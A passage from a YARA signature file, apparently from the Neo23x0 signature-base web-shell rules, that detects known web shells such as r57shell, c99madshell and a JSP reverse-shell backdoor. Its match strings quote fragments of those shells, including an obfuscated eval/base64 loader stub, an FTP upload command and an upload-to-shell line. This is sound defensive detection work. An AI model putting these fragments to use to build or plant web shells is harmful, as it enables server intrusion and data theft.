		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8b0e6779f25a17f0ffb3df14122ba594"
		logic_hash = "bdd2db4c032b25faaaf3a3a8e769000013f643ecfcb8b0374165a244ad2162a6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "// backdoor.jsp"
		$s1 = "JSP Backdoor Reverse Shell"
		$s2 = "http://michaeldaw.org"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Tool_Asp {
    meta:
		description = "Semi-Auto-generated  - file Tool.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e5e727bd-836b-5540-8755-40f37904bc03"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3765-L3778"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8febea6ca6051ae5e2ad4c78f4b9c1f2"
		logic_hash = "d6bd782302b2c614fc572babb3825c0e1fcd0de5841ca8541ca27580ccc274d4"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "mailto:rhfactor@antisocial.com"
		$s2 = "?raiz=root"
		$s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
		$s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"

	condition:
		2 of them
}
rule SIGNATURE_BASE_NT_Addy_Asp {
    meta:
		description = "Semi-Auto-generated  - file NT Addy.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "18f5f360-8690-5e09-ac18-b8cc4f678811"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3779-L3791"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2e0d1bae844c9a8e6e351297d77a1fec"
		logic_hash = "0fc61d5e276786b8be822712cdcfc81146998e535532e44d3da92e0668713a48"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
		$s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
		$s4 = "RAW D.O.S. COMMAND INTERFACE"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Simattacker___Vrsion_1_0_0___Priv8_4_My_Friend_Php {
    meta:
		description = "Semi-Auto-generated  - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8a34f4fd-337d-5eb4-b7b7-4adb1c2b7937"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3792-L3804"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
		logic_hash = "46bc4063d06b4af3e4e61e1e998d489e974e76f17363c9777b8afc39ff21f698"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
		$s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
		$s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Remexp_Asp {
    meta:
		description = "Semi-Auto-generated  - file RemExp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "900036ce-ff13-5441-bb77-906ea08a4ca0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3805-L3817"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
		logic_hash = "c7da9908a0252e95b47dbc8fbb36aeac1661dc464123aaca036bd51047a31584"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<title>Remote Explorer</title>"
		$s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
		$s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Phvayvv_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file phvayvv.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "76351a59-8f52-5110-a9b8-36edd59026df"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3818-L3830"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "35fb37f3c806718545d97c6559abd262"
		logic_hash = "503a69a7e2c30cc82eba430082627bb93c459a95f675b968126bf4524c598863"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "{mkdir(\"$dizin/$duzenx2\",777)"
		$s1 = "$baglan=fopen($duzkaydet,'w');"
		$s2 = "PHVayv 1.0"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Klasvayv_Asp {
    meta:
		description = "Semi-Auto-generated  - file klasvayv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3ca4c20c-f879-55a0-9070-d40fc903f9ae"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3831-L3844"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2b3e64bf8462fc3d008a3d1012da64ef"
		logic_hash = "eb1b11e02b075a4e7d28b77cf91ad596a85e4c697a36304ee177d46735965e75"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "set aktifklas=request.querystring(\"aktifklas\")"
		$s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
		$s3 = "<font color=\"#858585\">www.aventgrup.net"
		$s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"

	condition:
		1 of them
}
rule SIGNATURE_BASE_R57Shell_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file r57shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3845-L3858"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d28445de424594a5f14d0fe2a7c4e94f"
		logic_hash = "658eec4f3c463ec1a480bcb7ba995b8d81d1fb846832e569751d9f505f0fa87e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx "
		$s2 = "RusH security team"
		$s3 = "'ru_text12' => 'back-connect"
		$s4 = "<title>r57shell</title>"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Rst_Sql_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file rst_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3859-L3872"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0961641a4ab2b8cb4d2beca593a92010"
		logic_hash = "d15cf69d9ad8683d2ac1ff09b08b0b26ecaf35df8e45bbd5c3a02c393f88cb34"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "C:\\tmp\\dump_"
		$s1 = "RST MySQL"
		$s2 = "http://rst.void.ru"
		$s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Wh_Bindshell_Py {
    meta:
		description = "Semi-Auto-generated  - file wh_bindshell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b7acbfe7-fd28-5832-9af2-1c5befe4bbab"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3873-L3885"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fab20902862736e24aaae275af5e049c"
		logic_hash = "e38a4f5c23371705f9bbf2db8e65d68074554edc1022576166e76d40e06bc039"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#Use: python wh_bindshell.py [port] [password]"
		$s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
		$s3 = "#bugz: ctrl+c etc =script stoped=" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_Lurm_Safemod_On_Cgi {
    meta:
		description = "Semi-Auto-generated  - file lurm_safemod_on.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "74e77260-a547-5553-8430-2620f8549f50"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3886-L3898"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5ea4f901ce1abdf20870c214b3231db3"
		logic_hash = "d308ad6cda92fa437b9a4c46cd1b97fb0138aa8d0010256bda56a64ced1c7875"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Network security team :: CGI Shell" fullword
		$s1 = "#########################<<KONEC>>#####################################" fullword
		$s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword

	condition:
		1 of them
}
rule SIGNATURE_BASE_C99Madshell_V2_0_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file c99madshell_v2.0.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b0724920-dc1e-5819-a99b-618a9a7e1eca"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3899-L3909"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d27292895da9afa5b60b9d3014f39294"
		logic_hash = "07922511d9dfdd32f6b1f47479fca2063b773024a20dcab6f5cf4d56d66c3397"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"

	condition:
		all of them
}
rule SIGNATURE_BASE_Backupsql_Php_Often_With_C99Shell {
    meta:
		description = "Semi-Auto-generated  - file backupsql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3910-L3921"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ab1a06ab1a1fe94e3f3b7f80eedbc12f"
		logic_hash = "7c64e3d4e5815859c51f05cb376f72ea266b31193f3f4588526005e167ebabad"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ."
		$s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"

	condition:
		all of them
}
rule SIGNATURE_BASE_Uploader_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file uploader.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "62aa783b-f12f-5bb5-9d96-7aee1666788b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3922-L3934"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0b53b67bb3b004a8681e1458dd1895d0"
		logic_hash = "6e6ffc4cad2a956cb2b6667928bac5996cf95cd36f43ba789144c46726471f07"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
		$s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
		$s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Telnet_Pl {
    meta:
		description = "Semi-Auto-generated  - file telnet.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "be4de017-e929-5dd3-a60e-f187456b1a55"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3935-L3946"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "dd9dba14383064e219e29396e242c1ec"
		logic_hash = "2d1abc52fc70ce664a19e49e6fa4175bc8d8785dee332d5273323479d9628a8c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "W A R N I N G: Private Server"
		$s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "

	condition:
		all of them
}
rule SIGNATURE_BASE_W3D_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file w3d.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1a4e3c84-2d3b-5245-bccc-9a5f59b9fc17"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3947-L3959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "987f66b29bfb209a0b4f097f84f57c3b"
		logic_hash = "33f948a1ae4474daddd788df84fa8baabf4390ec242cad9a6a51dac0152d3b75"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "W3D Shell"
		$s1 = "By: Warpboy"
		$s2 = "No Query Executed"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Cgi {
    meta:
		description = "Semi-Auto-generated  - file WebShell.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b768bb72-64e8-545a-9123-3d5889b58a82"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3960-L3971"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "bc486c2e00b5fc3e4e783557a2441e6f"
		logic_hash = "8908ced96284de6b6d5ae693ba54c49a6333bbe5780d951cbacc91b4dde027df"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "WebShell.cgi"
		$s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"

	condition:
		all of them
}
rule SIGNATURE_BASE_Winx_Shell_Html {
    meta:
		description = "Semi-Auto-generated  - file WinX Shell.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fe02d995-4375-5ce9-aabe-fae5d29278d3"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3972-L3984"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
		logic_hash = "4248f807d66990946523ba7b92d795c2c40429182389d9bf3f4a972e246b50c6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "WinX Shell"
		$s1 = "Created by greenwood from n57"
		$s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Dx_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file Dx.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "67d0bccb-d39a-5e30-bdc0-801525ebddd7"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3985-L3997"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
		logic_hash = "ab43ddcf317eb4db890ca9750dc6bbc19b06b806339a67c82216df02bc2e8446"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Csh_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file csh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3998-L4011"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "194a9d3f3eac8bc56d9a7c55c016af96"
		logic_hash = "2a74e06a9fd59d7a577041b49403738904239fb011f9bfe2fb665165991b9c98"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ".::[c0derz]::. web-shell"
		$s1 = "http://c0derz.org.ua"
		$s2 = "vint21h@c0derz.org.ua"
		$s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Phpinj_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file pHpINJ.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7bf54ef4-a3d8-51c6-8db7-bf8947e992ed"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4012-L4024"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d7a4b0df45d34888d5a09f745e85733f"
		logic_hash = "5d39fd31cdaae7765267ce8a35a2fdcf86e7f0de40d4f303fb0f219c0fc04e40"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "News Remote PHP Shell Injection"
		$s3 = "Php Shell <br />" fullword
		$s4 = "<input type = \"text\" name = \"url\" value = \""

	condition:
		2 of them
}
rule SIGNATURE_BASE_Sig_2008_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file 2008.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "bfa3caa9-70a5-536b-a887-58427eee43df"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4025-L4038"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3e4ba470d4c38765e4b16ed930facf2c"
		logic_hash = "a437dc3dc836e93c7a691f7a000c4a4ae574ba95b3a216394ba42538beb9c0f7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Codz by angel(4ngel)"
		$s1 = "Web: http://www.4ngel.net"
		$s2 = "$admin['cookielife'] = 86400;"
		$s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Ak74Shell_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file ak74shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4039-L4051"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7f83adcb4c1111653d30c6427a94f66f"
		logic_hash = "64eb7e72679fc9ee81af6f46d0ab604357710716b93b1ddfaebc5596c968fce8"
		score = 75
		quality = 60
		tags = ""

	strings:
		$s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION["
		$s2 = "AK-74 Security Team Web Site: www.ak74-team.net"
		$s3 = "$xshell"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Rem_View_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file Rem View.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6137434c-89e9-537b-9b26-b56178022b76"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4052-L4064"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "29420106d9a81553ef0d1ca72b9934d9"
		logic_hash = "bcd5c86e793748ffe0ce4415ee68101e8183e1f97477b49843938d254f08695a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 = "Welcome to phpRemoteView (RemView)"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Java_Shell_Js {
    meta:
		description = "Semi-Auto-generated  - file Java Shell.js.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eff52c3a-fc3a-5e80-8da9-786168159ebc"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4065-L4077"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "36403bc776eb12e8b7cc0eb47c8aac83"
		logic_hash = "f312298ac30ab57b21222a529b1566b9a66909806e4bc88120ac3992cfd3c6fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
		$s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
		$s4 = "public static int DEFAULT_SCROLLBACK = 100"

	condition:
		2 of them
}
rule SIGNATURE_BASE_STNC_Php_Php {
    meta:
		description = "Semi-Auto-generated  - file STNC.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8a7167f6-fa62-574f-a37c-3ceadc7f92ec"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4078-L4091"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2e56cfd5b5014cbbf1c1e3f082531815"
		logic_hash = "b4118dc45ac109bde1cafda24cc103370db57c1993690f450cff828c1633af3c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "drmist.ru" fullword
		$s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
		$s2 = "STNC WebShell"
		$s3 = "http://www.security-teams.net/index.php?showtopic="

	condition:
		1 of them
}
rule SIGNATURE_BASE_Azrailphp_V1_0_Php {
    meta:
		description = "Semi-Auto-generated  - file aZRaiLPhp v1.0.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "60152b96-e8d3-5b06-a855-fb64a490742b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4092-L4104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "26b2d3943395682e36da06ed493a3715"
		logic_hash = "4385f294e59b644fe86d8380db4f7926924eb744ad80735b78ef778d2f7e8ae0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "azrailphp"
		$s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
		$s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Moroccan_Spamers_Ma_Edition_By_Ghost_Php {
    meta:
		description = "Semi-Auto-generated  - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "721d6e9f-a237-5462-a8d3-f838d7fda420"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L4105-L4117"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d1b7b311a7ffffebf51437d7cd97dc65"
		logic_hash = "e755e4ea467861e5217d532b161bf4c582ff71aa1e4720dfa4b75d6e8d7629d8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ";$sd98=\"john.barker446@gmail.com\""
		$s1 = "print \"Sending mail to $to....... \";"
		$s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Zacosmall_Php {
    meta:
		description = "Semi-Auto-generated  - file zacosmall.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "25946aa7-7c56-5670-ae2f-c55e65a3b911"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
